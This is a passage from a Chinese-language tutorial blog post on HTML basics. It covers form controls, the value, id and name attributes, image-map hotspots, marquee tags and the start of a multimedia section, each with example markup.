        <content type="html"><![CDATA[<h2 id="一、表单"><a href="#一、表单" class="headerlink" title="一、表单"></a>一、表单</h2><ul><li><p>提交方式：【get，post】</p><ul><li>最直观的区别就是GET把参数包含在URL中，POST通过request body传递参数。</li><li>GET不安全，相较而言POST安全一点</li></ul></li><li><p>形式：</p></li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">First name: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;firstname&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">Last name: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;lastname&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>表单标签汇总</p><p>- </p><ul><li><table><thead><tr><th align="center">标签</th><th align="left">描述</th></tr></thead><tbody><tr><td align="center">form</td><td align="left">定义供用户输入的表单</td></tr><tr><td align="center">input</td><td align="left">定义输入域</td></tr><tr><td align="center">textarea</td><td align="left">定义文本域 (一个多行的输入控件)</td></tr><tr><td align="center">label</td><td align="left">定义了 input元素的标签，一般为输入标题</td></tr><tr><td align="center">fieldstet</td><td align="left">定义了一组相关的表单元素，并使用外框包含起来,说明语义，更加友好</td></tr><tr><td align="center">legend</td><td align="left">定义了 fieldset 元素的标题</td></tr><tr><td align="center">select</td><td align="left">定义了下拉选项列表</td></tr><tr><td align="center">opgroup</td><td align="left">定义选项组</td></tr><tr><td align="center">option</td><td align="left">定义下拉列表中的选项</td></tr><tr><td align="center">button</td><td align="left">定义一个点击按钮</td></tr><tr><td align="center">datalist <strong>New</strong></td><td align="left">指定一个预先定义的输入控件选项列表</td></tr><tr><td align="center">keygen <strong>New</strong></td><td align="left">定义了表单的密钥对生成器字段</td></tr><tr><td align="center">output <strong>New</strong></td><td align="left">定义一个计算结果</td></tr></tbody></table></li></ul></li><li><p>表单标签使用案例</p><p>- </p>  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>表单标签使用案例<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>这部分内容分两个部分介绍<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>1.  基本标签<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>2. 表单和服务器的交互（Python Flask 构建框架）<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">        表单是接受用户输入，然后将输入传递给服务器，然后服务器根据用户的需求产生个性化输入的控件。</span><br><span class="line">    <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>表单控件的使用<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 基本结构 form开始和结束标签  --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- action指定数据交给服务器中那个程序处理 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- method规定使用什么方法传递数据：get  or post --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- autocomplete 用于启用自动填充 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;&quot;</span> <span class="attr">autocomplete</span>=<span class="string">&quot;on or off&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- input插件用于接受用户的输入，包含了多种输入插件 --&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--  name=&quot;必须&quot; type=&quot;text&quot; size=&quot;数字&quot; placeholder=&quot;提示信息&quot; --&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 关于label 要明白for的作用 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;user&quot;</span>&gt;</span>姓名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;user&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;请输入用户名&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;pass&quot;</span>&gt;</span>密码：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;pass&quot;</span> <span class="attr">id</span>=<span class="string">&quot;pass&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;请输入密码&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- 单选：radio --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;male&quot;</span>&gt;</span>性别：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">value</span>=<span class="string">&quot;male&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">id</span>=<span class="string">&quot;male&quot;</span>&gt;</span>男性</span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">value</span>=<span class="string">&quot;female&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">id</span>=<span class="string">&quot;female&quot;</span>&gt;</span>女性</span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 多选:checkbox  --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;sports&quot;</span>&gt;</span>爱好：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">value</span>=<span class="string">&quot;sports&quot;</span> <span class="attr">name</span>=<span class="string">&quot;fav&quot;</span> <span class="attr">id</span>=<span class="string">&quot;sports&quot;</span>&gt;</span>运动</span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">value</span>=<span class="string">&quot;reading&quot;</span> <span class="attr">name</span>=<span class="string">&quot;fav&quot;</span> <span class="attr">id</span>=<span class="string">&quot;reading&quot;</span>&gt;</span>读书</span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">value</span>=<span class="string">&quot;delicacy&quot;</span> <span class="attr">name</span>=<span class="string">&quot;fav&quot;</span> <span class="attr">id</span>=<span class="string">&quot;delicacy&quot;</span>&gt;</span>美食</span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 文件 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>上传附件：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- 命令按钮：四种按钮：命令，提交，置位，图像按钮 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;命令&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;reset&quot;</span> <span class="attr">value</span>=<span class="string">&quot;清空&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;image&quot;</span> <span class="attr">src</span>=<span class="string">&quot;./3rd class/img/goodbye.jpg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;图形按钮&quot;</span> <span class="attr">width</span>=<span class="string">&quot;2%&quot;</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">&lt;!-- html5 提供的新类型 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;email&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;url&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;color&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;date&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;time&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;datetime&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;range&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;search&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- 多行文本框：textarea 属性：names, rows，cols,values,maxlength --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;selfdescr&quot;</span>&gt;</span>个人描述：<span class="tag">&lt;/<span class="name">label</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">name</span>=<span class="string">&quot;selfdescr&quot;</span> <span class="attr">id</span>=<span class="string">&quot;selfdescr&quot;</span> <span class="attr">cols</span>=<span class="string">&quot;30&quot;</span> <span class="attr">rows</span>=<span class="string">&quot;10&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- 组合框：fieldset:将一组相关的输入集合在一起 --&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 组合框的标题：legend:组合框的标题 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">fieldset</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">legend</span>&gt;</span>健康信息：<span class="tag">&lt;/<span class="name">legend</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;name&quot;</span>&gt;</span>姓名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">id</span>=<span class="string">&quot;name&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;sex&quot;</span>&gt;</span>性别:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">id</span>=<span class="string">&quot;sex&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;height&quot;</span>&gt;</span>身高：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;height&quot;</span> <span class="attr">id</span>=<span class="string">&quot;height&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;weight&quot;</span>&gt;</span>体重：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;weight&quot;</span> <span class="attr">id</span>=<span class="string">&quot;weight&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;/<span class="name">fieldset</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- 下拉列表：select --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>下拉列表有两种形式：差别就是属性中的multiple<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span>1. 单项下拉列表<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span>2. 双向下拉列表<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>单向下拉列表<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">&quot;fruid&quot;</span> <span class="attr">id</span>=<span class="string">&quot;fruid&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;apple&quot;</span>&gt;</span>apple<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;pear&quot;</span>&gt;</span>pear<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;watermelon&quot;</span>&gt;</span>watermelon<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>多向下拉列表<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">&quot;fav&quot;</span> <span class="attr">id</span>=<span class="string">&quot;fav&quot;</span> <span class="attr">multiple</span>=<span class="string">&quot;multiple&quot;</span> <span class="attr">size</span>=<span class="string">&quot;3&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;tr&quot;</span>&gt;</span>travel<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;delicacy&quot;</span>&gt;</span>delicacy<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;sp&quot;</span>&gt;</span>sports<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;music&quot;</span>&gt;</span>music<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;reading&quot;</span>&gt;</span>reading<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;movie&quot;</span>&gt;</span>movie<span class="tag">&lt;/<span class="name">option</span>&gt;</span>    </span><br><span class="line">        <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>多向下拉分组列表<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">&quot;fav&quot;</span> <span class="attr">id</span>=<span class="string">&quot;fav&quot;</span> <span class="attr">multiple</span>=<span class="string">&quot;multiple&quot;</span> <span class="attr">size</span>=<span class="string">&quot;3&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">optgroup</span> <span class="attr">label</span>=<span class="string">&quot;户外运动&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;tr&quot;</span>&gt;</span>travel<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;sp&quot;</span>&gt;</span>sports<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;movie&quot;</span>&gt;</span>movie<span class="tag">&lt;/<span class="name">option</span>&gt;</span>    </span><br><span class="line">            <span class="tag">&lt;/<span class="name">optgroup</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">optgroup</span> <span class="attr">label</span>=<span class="string">&quot;室内运动&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;delicacy&quot;</span>&gt;</span>delicacy<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;music&quot;</span>&gt;</span>music<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;reading&quot;</span>&gt;</span>reading<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">optgroup</span>&gt;</span>    </span><br><span class="line">        <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span>    </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="二、value、id、name详解"><a href="#二、value、id、name详解" class="headerlink" title="二、value、id、name详解"></a>二、value、id、name详解</h2><ul><li>name是控件的名称 ，value是控件的值， id是控件的身份标志。</li><li>value：<ul><li><strong>对于 “button”、“reset”、“submit” 类型 - 定义按钮上的文本</strong></li><li><strong>对于 “text”、“password”、“hidden” 类型 - 定义输入字段的初始（默认）值</strong></li><li><strong>对于 “checkbox”、“radio”、“image” 类型 - 定义与 input 元素相关的值，当提交表单时该值会发送到表单的 action URL。</strong></li></ul></li></ul><blockquote><p>注意：value 属性对于 ＜input type&#x3D;”checkbox”＞和 ＜input type&#x3D;”radio”＞ 是必需的。<br>注意：value 属性不适用于 ＜input type&#x3D;”file”＞</p></blockquote><ul><li><p>＜input＞<strong>name</strong> 属性</p><ul><li><p><strong>name 属性规定 ＜input＞元素的名称。<br>name 属性用于在 JavaScript 中引用元素，或者在表单提交后引用表单数据。</strong></p><blockquote><p>注意：只有设置了 name 属性的表单元素才能在提交表单时传递它们的值。</p></blockquote></li></ul></li><li><p>总结：</p><ul><li>name主要是表单元素里才有的属性。通过js的document.表单名称.文本框.value来获取文本框的值，其中的表单名称和文本框名称指的是name,</li><li>而非表单元素例如div，span等是没有name属性的，而id属性是任何一个HTML元素都会有的。当你需要用js获取非表单元素对象是就得用document.getElementByIdx(“id”)</li><li>value用于数据库传值，name用来标识</li></ul></li></ul><h2 id="三、地图热点"><a href="#三、地图热点" class="headerlink" title="三、地图热点"></a>三、地图热点</h2><ul><li><p>用坐标来选定图像的区域并关联超链接</p></li><li><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>地图和地图热点演示<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;./img/animal.jpg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;9 grid picture&quot;</span> <span class="attr">usemap</span>=<span class="string">&quot;#ninegrid&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">map</span> <span class="attr">name</span>=<span class="string">&quot;ninegrid&quot;</span> <span class="attr">id</span>=<span class="string">&quot;ninegrid&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">area</span> <span class="attr">shape</span>=<span class="string">&quot;rect&quot;</span> <span class="attr">coords</span>=<span class="string">&quot;0,0,120,120&quot;</span> <span class="attr">href</span>=<span class="string">&quot;http://www.scu.edu.cn&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">area</span> <span class="attr">shape</span>=<span class="string">&quot;rect&quot;</span> <span class="attr">coords</span>=<span class="string">&quot;120,0,240,120&quot;</span> <span class="attr">href</span>=<span class="string">&quot;http://www.uestc.edu.cn&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">area</span> <span class="attr">shape</span>=<span class="string">&quot;rect&quot;</span> <span class="attr">coords</span>=<span class="string">&quot;240,0,360,120&quot;</span> <span class="attr">href</span>=<span class="string">&quot;https://www.swjtu.edu.cn/&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">area</span> <span class="attr">shape</span>=<span class="string">&quot;rect&quot;</span> <span class="attr">coords</span>=<span class="string">&quot;360,0,480,120&quot;</span> <span class="attr">href</span>=<span class="string">&quot;https://www.swufe.edu.cn/&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="四、走马丁（弹幕）"><a href="#四、走马丁（弹幕）" class="headerlink" title="四、走马丁（弹幕）"></a>四、走马丁（弹幕）</h2><p>- </p>  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>基本效果<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">marquee</span> <span class="attr">behavior</span>=<span class="string">&quot;&quot;</span> <span class="attr">direction</span>=<span class="string">&quot;&quot;</span>&gt;</span>我是基础的走马灯！<span class="tag">&lt;/<span class="name">marquee</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>behavior控制走马灯运动效果，默认循环滚动（alternate）<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">marquee</span> <span class="attr">behavior</span>=<span class="string">&quot;slide&quot;</span> <span class="attr">direction</span>=<span class="string">&quot;&quot;</span>&gt;</span>我幻灯片模式，滚动到边停<span class="tag">&lt;/<span class="name">marquee</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>direction 控制方向（默认left,方向从右边到左）<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">marquee</span> <span class="attr">behavior</span>=<span class="string">&quot;&quot;</span> <span class="attr">direction</span>=<span class="string">&quot;up&quot;</span>&gt;</span>上走马<span class="tag">&lt;/<span class="name">marquee</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">marquee</span> <span class="attr">behavior</span>=<span class="string">&quot;&quot;</span> <span class="attr">direction</span>=<span class="string">&quot;down&quot;</span>&gt;</span>下走马<span class="tag">&lt;/<span class="name">marquee</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">marquee</span> <span class="attr">behavior</span>=<span class="string">&quot;&quot;</span> <span class="attr">direction</span>=<span class="string">&quot;right&quot;</span>&gt;</span>右走马<span class="tag">&lt;/<span class="name">marquee</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>scrollamout用于设置滚动速度，默认为1，值越大，速度越快，5-10适合观看<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">marquee</span> <span class="attr">behavior</span>=<span class="string">&quot;&quot;</span> <span class="attr">direction</span>=<span class="string">&quot;&quot;</span> <span class="attr">scrollamount</span>=<span class="string">&quot;10&quot;</span>&gt;</span>我是速度为5的走马灯<span class="tag">&lt;/<span class="name">marquee</span>&gt;</span>\</span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>设置滚动范围控制 width height; 滚动背景颜色 bgcolor<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">marquee</span> <span class="attr">direction</span>=<span class="string">&quot;up&quot;</span> <span class="attr">width</span>=<span class="string">&quot;100&quot;</span> <span class="attr">height</span>=<span class="string">&quot;100&quot;</span> <span class="attr">bgcolor</span>=<span class="string">&quot;deeppin&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>使用很简单，就是简单的属性堆叠，很多属性一查便知，在此只简单放一个实例</p></blockquote><h2 id="四、视频音频"><a href="#四、视频音频" class="headerlink" title="四、视频音频"></a>四、视频音频</h2><p>- </p>  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>多媒体标签演示<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">   <span class="comment">&lt;!-- 音频标签 --&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">audio</span> <span 